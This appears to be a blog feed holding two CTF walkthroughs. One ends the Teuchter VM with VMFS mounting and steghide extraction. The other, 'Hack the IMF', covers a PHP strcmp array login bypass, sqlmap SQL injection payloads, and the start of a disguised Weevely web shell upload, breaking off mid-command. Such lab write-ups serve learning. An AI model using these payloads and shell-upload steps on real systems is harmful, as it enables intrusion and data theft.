</span><span class='line'>Description: Tools to access VMFS filesystems
</span><span class='line'> VMFS is a clustered filesystem designed to store virtual machine disks for
</span><span class='line'> VMware ESX or ESXi Server hosts. This set of tools allows to access these
</span><span class='line'> filesystems from some other non ESX/ESXi host for e.g. maintenance tasks.
</span><span class='line'> .
</span><span class='line'> Only read access is available at the moment, but write access is under
</span><span class='line'> works. Multiple extents are supported.
</span><span class='line'> .
</span><span class='line'> The VMFS can be accessed with a command line tool or mounted through a
</span><span class='line'> userspace filesystem (FUSE-based).
</span><span class='line'>Description-md5: 0cdea504f6c5a9da0070eeda2f011352
</span><span class='line'>Tag: admin::filesystem, admin::kernel, admin::virtualization,
</span><span class='line'> implemented-in::c, role::program
</span><span class='line'>Section: otherosfs
</span><span class='line'>Priority: extra
</span><span class='line'>Filename: pool/main/v/vmfs-tools/vmfs-tools_0.2.5-1+b2_amd64.deb</span></code></pre></td></tr></table></div></figure>


<p>Ah installed the package, and then hit a standstill on how to actually mount the virtual disk. After trying several approaches and failing, what worked was attaching the VMDK to my Kali virtual machine from the host. Ah had to change the compatibility of my VM for that to work, but it could possibly also work by editing the VMDK and changing <em>ddb.virtualHWVersion</em> to a version matching the VM&rsquo;s compatibility, but Ah haven&rsquo;t tried that. After doing it like that, Ah was able to see the disk under <em>/dev/sdb1</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l
</span><span class='line'>Disk /dev/sdb: 2 GiB, 2147483648 bytes, 4194304 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: gpt
</span><span class='line'>Disk identifier: AD5D7662-CD00-4621-AF02-68A05AD0A688
</span><span class='line'>
</span><span class='line'>Device     Start     End Sectors Size Type
</span><span class='line'>/dev/sdb1   2048 4194270 4192223   2G VMware VMFS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: dos
</span><span class='line'>Disk identifier: 0xa89dd27d
</span><span class='line'>
</span><span class='line'>Device     Boot    Start      End  Sectors Size Id Type
</span><span class='line'>/dev/sda1  *        2048 79693823 79691776  38G 83 Linux
</span><span class='line'>/dev/sda2       79695870 83884031  4188162   2G  5 Extended
</span><span class='line'>/dev/sda5       79695872 83884031  4188160   2G 82 Linux swap / Solaris</span></code></pre></td></tr></table></div></figure>


<p>Now Ah could mount it and see what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# vmfs-fuse /dev/sdb1 /mnt/vmdk
</span><span class='line'>root@kali:~# ls /mnt/vmdk
</span><span class='line'>hint.txt  redkola</span></code></pre></td></tr></table></div></figure>


<p>The hint mentions a password made of 25 characters that we should be able to find from what we&rsquo;ve been through:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat hint.txt 
</span><span class='line'>Almost there.. Check the ISO and remember password relates to the TV Advert ye watched.
</span><span class='line'>
</span><span class='line'>Ah took out the spaces but it's 25 characters but the Wikipedia page will get it for ye.</span></code></pre></td></tr></table></div></figure>


<p>In the redkola (Irn-Bru, anyone?) folder there are more VMDK files, but at least the hint focuses us on the ISO:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>oot@kali:/mnt/vmdk/redkola# ls
</span><span class='line'>redkola_1-flat.vmdk  redkola.iso    redkola.vmsd
</span><span class='line'>redkola_1.vmdk       redkola.nvram  redkola.vmx</span></code></pre></td></tr></table></div></figure>


<p>Ah mounted the ISO next:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -o loop,ro redkola.iso /mnt/redkola
</span><span class='line'>root@kali:/mnt/redkola# ls
</span><span class='line'>glass_ch.jpg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/glass_ch.jpg" title="glass cheque" alt="irn-bru!!!!!!"></p>

<p>All that Irn-Bru! And with something extra, perhaps? Enter steghide!</p>

<h4>steghide</h4>

<blockquote><p>Steghide  is a steganography program that is able to hide data in various kinds of
image- and audio-files. The color- respectivly sample-frequencies  are  not  changed thus making
the embedding resistant against first-order statistical tests.</p>

<p>Features include the compression of the embedded  data,  encryption  of
the  embedded  data  and automatic integrity checking using a checksum.
The JPEG, BMP, WAV and AU file formats are supported for use  as  cover
file. There are no restrictions on the format of the secret data.</p></blockquote>

<p>Steghide can also be used to check for the presence of a secret message and to extract it, if provided the correct passphrase. Putting together all the hints (scotland, girders, irn-bru wiki page) or just watching and listening to the advert gives us the passphrase <code>madeinscotlandfromgirders</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide info glass_ch.jpg 
</span><span class='line'>"glass_ch.jpg":
</span><span class='line'>  format: jpeg
</span><span class='line'>  capacity: 3.9 KB
</span><span class='line'>Try to get information about embedded data ? (y/n) y
</span><span class='line'>Enter passphrase: 
</span><span class='line'>  embedded file "realflag.txt":
</span><span class='line'>    size: 972.0 Byte
</span><span class='line'>    encrypted: rijndael-128, cbc
</span><span class='line'>    compressed: yes</span></code></pre></td></tr></table></div></figure>


<p>Aaand, after much pain, we have the flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf glass_ch.jpg 
</span><span class='line'>Enter passphrase: 
</span><span class='line'>wrote extracted data to "realflag.txt".</span></code></pre></td></tr></table></div></figure>


<p>Achievement unlocked: Unlimited Irn-Bru!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat realflag.txt 
</span><span class='line'>
</span><span class='line'>Gaun Yersel Big Man! B-)
</span><span class='line'>
</span><span class='line'>Congratulations for the fifth time on capturing this flag!
</span><span class='line'>
</span><span class='line'>Yes, I know this VM has really got on your nerves, and that was the main
</span><span class='line'>point...
</span><span class='line'>
</span><span class='line'>I decided to have some fun with you, and hopefully you have learned some
</span><span class='line'>new ways to look at things. You know, all this could have been avoided
</span><span class='line'>if Siri just leanred what "outwith" means, I wouldn't have to build this
</span><span class='line'>VM. I'm trolling you again of course!
</span><span class='line'>
</span><span class='line'>I hope this VM was fun for you, and I'm sure you can now insult people
</span><span class='line'>in another language :-)
</span><span class='line'>
</span><span class='line'>Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
</span><span class='line'>for trolling everyone.
</span><span class='line'>
</span><span class='line'>Shout-outs yet again to #vulnhub for hosting a great learning tool and
</span><span class='line'>being a great inspiration to make these VMs. A special thanks goes to
</span><span class='line'>mrb3n, cmaddy and GKNSB for repeated testing. Many thanks to g0tM1lk
</span><span class='line'>for providing some valuable feedback and offering to host my CTF again.
</span><span class='line'>                                                           --Knightmare</span></code></pre></td></tr></table></div></figure>


<p>This challenge cost me 1.5 days of the weekend, but it was funny as feck! And Ah learned a couple slang words that will sure come in handy. AND IRN-BRU!!! Which, in case ye haven&rsquo;t figured it out, stands for Iron Brew! Cheers, knightmare!</p>

<p>Just gonna leave this here:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/irn-bru.jpg" title="irn-bru" alt="iron brew effect"></p>

<p>And this:</p>

<ul>
<li><a href="https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/">https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/</a></li>
</ul>


<p>It&rsquo;s not over:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ When I'm a burger, Ah want to be washed \
</span><span class='line'>\ down with Irn-Bru                      /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack the IMF]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/06/hack-the-imf/"/>
    <updated>2018-10-06T02:45:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/06/hack-the-imf</id>
    <content type="html"><![CDATA[<p>The VM description states that IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag.</p>

<p>The difficulty is Beginner/Moderate</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: IMF - Homepage</span></code></pre></td></tr></table></div></figure>


<p>Only port 80 is open, so let&rsquo;s begin from there.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/home.png" title="homepage" alt="impossible mission force"></p>

<p>So we learn that IMF stands for Impossible Mission Force and that it&rsquo;s a US intelligence agency. 3-letter agencies everywhere!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/projects.png" title="projects" alt="imf projects"></p>

<p>The Projects page makes for a fun read and it also reveals that the site is using PHP.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/contact.png" title="contact" alt="imf contact"></p>

<p>The contact page gives us some names and mail addresses:</p>

<ul>
<li>Roger S. Michaels &ndash; <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#114;&#x6d;&#105;&#99;&#104;&#x61;&#101;&#108;&#115;&#64;&#105;&#x6d;&#x66;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;">&#114;&#x6d;&#105;&#99;&#104;&#97;&#x65;&#x6c;&#x73;&#x40;&#105;&#x6d;&#x66;&#x2e;&#x6c;&#x6f;&#x63;&#97;&#x6c;</a></li>
<li>Alexander B. Keith &ndash; <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x61;&#x6b;&#101;&#x69;&#x74;&#104;&#64;&#x69;&#x6d;&#x66;&#46;&#108;&#111;&#x63;&#x61;&#108;">&#97;&#107;&#x65;&#x69;&#x74;&#x68;&#64;&#x69;&#x6d;&#x66;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;</a></li>
<li>Elizabeth R. Stone &ndash; <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x65;&#x73;&#116;&#x6f;&#x6e;&#101;&#x40;&#105;&#109;&#x66;&#x2e;&#108;&#x6f;&#99;&#97;&#108;">&#x65;&#x73;&#x74;&#x6f;&#110;&#x65;&#64;&#105;&#109;&#102;&#46;&#x6c;&#111;&#99;&#97;&#x6c;</a></li>
</ul>


<h1>Flag #1 &ndash; Read the source</h1>

<p>The first flag can be found as a HTML comment in the source of the contact.php page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- flag1{YWxsdGhlZmlsZXM=} --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Decoding the base64 flag gives the hint <code>allthefiles</code>.</p>

<h1>Flag #2 &ndash; JS includes</h1>

<p>I interpreted the hint to mean bruteforce, but I tried with multiple tools and wordlists and didn&rsquo;t find anything. Going back through the HTML source, I noticed that several of the included Javascript files look like base64:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>    &lt;script src="js/ZmxhZzJ7YVcxbVl.js"&gt;&lt;/script&gt;
</span><span class='line'>    &lt;script src="js/XUnRhVzVwYzNS.js"&gt;&lt;/script&gt;
</span><span class='line'>    &lt;script src="js/eVlYUnZjZz09fQ==.min.js"&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>Putting them all together gives the string <em>ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</em>, which yields the second flag when decoded: <em>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</em>. This, in turn, gives the next hint: <code>imfadministrator</code></p>

<h1>Flag #3 &ndash; Exploiting PHP strcmp function</h1>

<p>With no other services available, everything revolves around the site. Using the above hint in the URL takes us to a hastily-made login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/login.jpg" title="login" alt="login"></p>

<p>And in the source there&rsquo;s an interesting comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Ok, this added an interesting twist that exploits PHP functionality. Since the password is hardcoded, when attempting to log in we&rsquo;d expect a string comparison to be made between the user input and the hardcoded password value. This is done in PHP through the use of the <strong>strcmp()</strong> function:</p>

<p>strcmp(string1,string2)</p>

<p>This function returns:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0 - if the two strings are equal
</span><span class='line'>&lt;0 - if string1 is less than string2
</span><span class='line'>&gt;0 - if string1 is greater than string2</span></code></pre></td></tr></table></div></figure>


<p>However, when reading through its <a href="https://secure.php.net/manual/en/function.strcmp.php">manual page</a>, there was a very interesting comment by chris at unix-ninja dot com:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strcmp() will return NULL on failure.
</span><span class='line'>
</span><span class='line'>This has the side effect of equating to a match when using an equals comparison (==).
</span><span class='line'>Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.
</span><span class='line'>
</span><span class='line'>---------------------
</span><span class='line'>  Example
</span><span class='line'>---------------------
</span><span class='line'>
</span><span class='line'>$variable1 = array();
</span><span class='line'>$ans === strcmp($variable1, $variable2);
</span><span class='line'>
</span><span class='line'>This will stop $ans from returning a match;
</span><span class='line'>
</span><span class='line'>Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.</span></code></pre></td></tr></table></div></figure>


<p>If we build on this example, in case the login page was codded with an equals comparison, making the function fail may exhibit the same behavior as if the strings matched. And to do that, we&rsquo;ll have to compare the hardcoded string with something that is not a string, like an array in this example. I used Burp to intercept the POST request that looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user=&lt;input&gt;&pass=&lt;input&gt;</span></code></pre></td></tr></table></div></figure>


<p>For the user, I used Roger&rsquo;s username that we&rsquo;ve discovered earlier. And then passed the password as an array:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user=rmichaels&pass[]=fail</span></code></pre></td></tr></table></div></figure>


<p>And the login succeeded!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag3{Y29udGludWVUT2Ntcw==}
</span><span class='line'>Welcome, rmichaels
</span><span class='line'>IMF CMS</span></code></pre></td></tr></table></div></figure>


<p>The decoded flag says <code>continueTOcms</code>. And that IMF CMS is a link to <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=home">http://192.168.145.130/imfadministrator/cms.php?pagename=home</a></p>

<h1>Flag #4 &ndash; SQLi</h1>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/cms.jpg" title="imf cms" alt="imf cms"></p>

<p>The Upload Report page is under construction. The Disavowed list is redacted:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/list.png" title="list" alt="list"></p>

<p>In the URL, observe how the pages are constructed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cms.php?pagename=disavowlist</span></code></pre></td></tr></table></div></figure>


<p>I tried inserting a single quote in the pagename parameter and sure enough, a SQL error!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29</span></code></pre></td></tr></table></div></figure>


<p>Time for sqlmap!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u http://192.168.145.130/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=o5jl7cjuohite8ifu20fghfkq1" --dbms=MySQL --dump-all
</span><span class='line'>
</span><span class='line'>GET parameter 'pagename' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
</span><span class='line'>sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
</span><span class='line'>---
</span><span class='line'>Parameter: pagename (GET)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: AND boolean-based blind - WHERE or HAVING clause
</span><span class='line'>    Payload: pagename=upload' AND 8343=8343 AND 'viDd'='viDd
</span><span class='line'>
</span><span class='line'>    Type: error-based
</span><span class='line'>    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</span><span class='line'>    Payload: pagename=upload' AND (SELECT 7643 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(7643=7643,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gVxy'='gVxy
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL &gt;= 5.0.12 AND time-based blind
</span><span class='line'>    Payload: pagename=upload' AND SLEEP(5) AND 'UvGQ'='UvGQ
</span><span class='line'>---
</span><span class='line'>[04:20:24] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
</span><span class='line'>web application technology: Apache 2.4.18
</span><span class='line'>back-end DBMS: MySQL &gt;= 5.0</span></code></pre></td></tr></table></div></figure>


<p>The output was huge, so here I left only the relevant part:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database: admin
</span><span class='line'>Table: pages
</span><span class='line'>[4 entries]
</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| id | pagename             | pagedata                                                                                                                                                              |
</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| 1  | upload               | Under Construction.                                                                                                                                                   |
</span><span class='line'>| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
</span><span class='line'>| 3  | tutorials-incomplete | Training classrooms available. &lt;br /&gt;&lt;img src="./images/whiteboard.jpg"&gt;&lt;br /&gt; Contact us for training.                                                               |
</span><span class='line'>| 4  | disavowlist          | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src="./images/redacted.jpg"&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary |
</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>The admin DB contains a table with the pages that we&rsquo;ve seen in the CMS, but it looks like there&rsquo;s an extra page we didn&rsquo;t know about! Let&rsquo;s see it!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/tutorials.png" title="tutorials" alt="tutorials"></p>

<p>I used an online barcode reader for the QR code which revealed the flag: <em>flag4{dXBsb2Fkcjk0Mi5waHA=}</em>. And the next hint is <code>uploadr942.php</code></p>

<h1>Flag #5 &ndash; PHP shell upload</h1>

<p>Going to <a href="http://192.168.145.130/imfadministrator/uploadr942.php">http://192.168.145.130/imfadministrator/uploadr942.php</a> takes us to an upload form:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/upload.jpg" title="upload" alt="upload"></p>

<p>Attempting to directly upload a PHP shell fails with an invalid file extension message. Then I tried a GIF downloaded from the internet, but another error, that the file is too large. So I just created a makeshift file with the GIF89 magic number and uploaded it with no problems. There was no mention of where ig might be located, but in the source code of the page now appeared a HTML comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- d8988628c59f --&gt;</span></code></pre></td></tr></table></div></figure>


<p>I tried putting that in the URL with a GIF extension, but that was a no-go. So I fired up dirb to see if there are any other directories under imfadministrator:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/wordlists/dirb# dirb http://192.168.145.130/imfadministrator/ common.txt 
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://192.168.145.130/imfadministrator/ ----
</span><span class='line'>==&gt; DIRECTORY: http://192.168.145.130/imfadministrator/images/                 
</span><span class='line'>+ http://192.168.145.130/imfadministrator/index.php (CODE:200|SIZE:337)        
</span><span class='line'>==&gt; DIRECTORY: http://192.168.145.130/imfadministrator/uploads/        </span></code></pre></td></tr></table></div></figure>


<p>Awesome, it found and uploads directory. This time I appended the previous name to this new path and it found my GIF file. So the next thing was to repeat the process of a previous challenge and try uploading a PHP shell disguised as a GIF image. But today I decided to experiment with a different type of shell.</p>

<h2>TTP breakdown &ndash; Weevely Weaponized web shell</h2>

<p>Homepage: <a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>

<p><strong>Description</strong></p>

<blockquote><p>Weevely is a web shell designed for post-exploitation purposes that can be extended over the
network at runtime.</p>

<p>Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than
30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate
privileges, and spread into the target network.</p>

<p>Features</p>

<p>   Shell access to the target</p>

<p>   SQL console pivoting on the target</p>

<p>   HTTP/HTTPS proxy to browse through the target</p>

<p>   Upload and download files</p>

<p>   Spawn reverse and direct TCP shells</p>

<p>   Audit remote target security</p>

<p>   Run Meterpreter payloads</p>

<p>   Port scan pivoting on target</p>

<p>   Mount the remote filesystem</p>

<p>   Bruteforce SQL accounts pivoting on the target</p>

<p>Agent</p>

<p>The agent is a small, polymorphic PHP script hardly detected by AV and the communication protocol
is obfuscated within HTTP requests.</p></blockquote>

<p>First, I installed Weevely on my machine by cloning its git repository and installing the requirements:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/opt/weevely3# apt-get install g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev
</span><span class='line'>
</span><span class='line'>root@kali:/opt/weevely3# pip install -r requirements.txt --upgrade</span></code></pre></td></tr></table></div></figure>


<p>Then I ran the Weevely client:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/opt/weevely3# ./weevely.py 
</span><span class='line'>
</span><span class='line'>[+] weevely 3.6.2
</span><span class='line'>[!] Error: too few arguments
</span><span class='line'>
</span><span class='line'>[+] Run terminal or command on the target
</span><span class='line'>    weevely &lt;URL&gt; &lt;password&gt; [cmd]
</span><span class='line'>
</span><span class='line'>[+] Recover an existing session
</span><span class='line'>    weevely session &lt;path&gt; [cmd]
</span><span class='line'>
</span><span class='line'>[+] Generate new agent
</span><span class='line'>    weevely generate &lt;password&gt; &lt;path&gt;</span></code></pre></td></tr></table></div></figure>


<p>We need to generate the agent that we&rsquo;ll actually upload to the target server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./weevely.py generate securepass harmless.php
